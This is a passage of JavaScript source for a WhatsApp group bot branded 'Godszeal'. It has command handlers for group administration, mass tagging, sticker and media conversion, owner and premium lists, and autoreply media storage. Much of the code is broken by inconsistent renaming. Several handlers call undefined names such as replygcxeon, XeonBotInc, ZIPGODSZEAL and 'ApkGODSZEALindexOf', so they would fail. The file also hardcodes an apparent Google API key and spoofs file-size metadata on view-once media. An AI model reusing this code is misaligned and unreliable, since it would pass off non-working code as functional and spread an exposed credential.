                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (!text) return 'Text ?'
                await GODSZEALBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcgodszeal(mess.success)).catch((err) => replygcgodszeal(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (!text) return 'Text ?'
                await GODSZEALBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcgodszeal(mess.success)).catch((err) => replygcgodszeal(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (!quoted) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GODSZEALBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcgodszeal(mess.done)
                } else {
                    var memeg = await GODSZEALBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcgodszeal(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let teks = `*╔══ஓ๑𝓣𝓐𝓖𝓐𝓛𝓛๑ஓ══╗*
 
                 🗞✎ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (!isAdmins) return replygcgodszeal(mess.admin)
                if (!m.quoted) return replygcgodszeal(`Reply messages with captions ${prefix + command}`)
                GODSZEALBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (args[0] === 'close') {
                    await GODSZEALBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcgodszeal(`Success In Closing The Group 🕊️`)).catch((err) => replygcgodszeal(json(err)))
                } else if (args[0] === 'open') {
                    await GODSZEALBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcgodszeal(`Success In Opening The Group 🕊️`)).catch((err) => replygcgodszeal(json(err)))
                } else {
                    replygcgodszeal(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (args[0] === 'open') {
                    await GODSZEALBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcgodszeal(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcgodszeal(json(err)))
                } else if (args[0] === 'close') {
                    await GODSZEALBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcgodszeal(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcgodszeal(json(err)))
                } else {
                    replygcgodszeal(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let response = await GODSZEALBotInc.groupInviteCode(m.chat)
                GODSZEALBotInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                await GODSZEALBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcgodszeal(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcgodszeal(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await GODSZEALBotInc.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://github.com/HaroldMth/Hans-Bug-Bot/blob/master/thunb.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await GODSZEALBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://github.com/HaroldMth/Hans-Bug-Bot/blob/master/thunb.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://github.com/AiOfLautech/Godszeal-Bug-Bot/blob/master/thumb.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: `Helllo world`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @AiOFLautech`,
                            thumbnailUrl: 'https://github.com/AiOfLautech/Godszeal-Bug-Bot/blob/master/thumb.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nAll i need is follow on my telegram channel`
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: 'Https://t.me/aitoolshub01' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await GODSZEALBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
GODSZEALnBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcgodszeal(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await GODSZEALBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcgodszeal('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await GODSZEALBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcgodszeal(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcgodszeal(respond)
                if (!text) return replygcgodszeal(respond)
                replygcgodszeal(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await GODSZEALBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await GODSZEALBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcgodszeal(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
GODSZEALBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
GODSZEALBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await GODSZEALBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcgodszeal('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await GODSZEALBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcgodszeal(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcgodszeal(`Reply sticker with caption *${prefix + command}*`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    GODSZEALBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcgodszeal(`Reply sticker with caption *${prefix + command}*`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GODSZEALBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcgodszeal(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                GODSZEALBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcgodszeal(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                GODSZEALBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Godszeal.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcgodszeal(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                GODSZEALBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcgodszeal(`Reply sticker with caption *${prefix + command}*`)
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GODSZEALLBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcgodszeal(mess.wait)
                let media = await GODSZEALBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcgodszeal(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcgodszeal(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcgodszeal(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcgodszeal(`Example : ${prefix + command} 😅+🤔`)
                replygcgodszeal(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await GODSZEALBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcgodszeal(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
                    GODSZEALBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
                    GODSZEALBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcgodszeal(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await GODSZEALBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcgodszeal(`Example:\n${prefix}fliptext GODSZEALy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcgodszeal(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteGODSZEAL) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteGODSZEAL.length}*`
                replygcgodszeal(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerGODSZEAL) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerGODSZEAL.length}*`
                replygcgodszeal(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageGODSZEAL) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageGODSZEAL.length}*`
                replygcgodszeal(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoGODSZEAL) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoGODSZEAL.length}*`
                replygcgodszeal(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcgodszeal(mess.owner)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await GODSZEALBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcgodszeal(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcgodszeal(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replygcgodszeal(mess.owner)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} nomor\nExample ${prefix+command} 2347049283499`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcgodszeal(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcgodszeal(mess.prem)
                if (args.length < 1) return replygcgodszeal('Video Name?')
                if (VideoGODSZEAL.includes(q)) return replygcxeon("The name you entered already exists")
                let delb = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
                VideoGODSZEAL.push(q)
                await fsx.copy(delb, `./modsMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoGODSZEAL))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replygcxeon("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./modsMedia/video/${q}.mp4`)
                replygcxeon(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('The name of the image?')
                if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./modsMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replygcxeon("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./modsMedia/image/${q}.jpg`)
                replygcxeon(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./modsMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerXeonBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./modsMedia/sticker/${q}.webp`)
                replygcxeon(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./modsMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteGODSZEAL))
                fs.unlinkSync(delb)
                replygcgodszeal(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcgodszeal(mess.prem)
                if (args.length < 1) return replygcgodszeal('Enter the Name')
                if (!VoiceNoteGODSZEAL.includes(q)) return replygcgodszeal("Name Not Registered in Database")
                let wanu = VoiceNoteGODSZEAL.indexOf(q)
                VoiceNoteGODSZEAL.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteGODSZEAL))
                fs.unlinkSync(`./modsMedia/audio/${q}.mp3`)
                replygcgodszeal(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal(`What's the zip name?`)
let teks = `${text}`
{
if (ZipGODSZEAL.includes(teks)) return replygcgodszeal("This name is already in use")
let delb = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
ZipGODSZEAL.push(teks)
await fsx.copy(delb, `./modsMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZIPGODSZEAL))
fs.unlinkSync(delb)
replygcgodszeal(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipGODSZEAL.includes(teks)) return replygcgodszeal("This name does not exist in the database")
let wanu = ZipGODSZEAL.indexOf(teks)
ZipGODSZEAL.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZIPGODSZEAL))
fs.unlinkSync(`./modsMedia/zip/${teks}.zip`)
replygcgodszeal(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipGODSZEAL) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipGODSZEAL.length}*`
replygcgodszeal(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal('What is the name of the apk?')
let teks = `${text}`
{
if (ApkGODSZEAL.includes(teks)) return replygcgodszeal("This name is already in use")
let delb = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./modsMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(APKGODSZEAL))
fs.unlinkSync(delb)
replygcgodszeal(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal('Name of the apk?')
let teks = `${text}`
{
if (!ApkGODSZEAL.includes(teks)) return replygcgodszeal("This name does not exist in the database")
let wanu = ApkGODSZEALindexOf(teks)
ApkGODSZEAL.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkGODSZEAL))
fs.unlinkSync(`./modsMedia/apk/${teks}.apk`)
replygcgodszeal(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkGODSZEAL) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkGODSZEAL.length}`
replygcgodszeal(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal('What is the name of the pdf')
let teks = `${text}`
{
if (DocGODSZEAL.includes(teks)) return replygcgodszeal("This name is already in use")
let delb = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./modsMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocGODSZEAL))
fs.unlinkSync(delb)
replygcgodszeal(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcgodszeal(mess.prem)
await loading()
if (args.length < 1) return replygcgodszeal('Enter the name')
let teks = `${text}`
{
if (!DocGODSZEAL.includes(teks)) return replygcgodszeal("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocGODSZEAL))
fs.unlinkSync(`./modsMedia/doc/${teks}.pdf`)
replygcgodszeal(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcgodszeal(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (isAfkOn) return replygcgodszeal("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcgodszeal(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replygcgodszeal(`Example : ${prefix + command} anime whatsapp status`)
const godszealplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
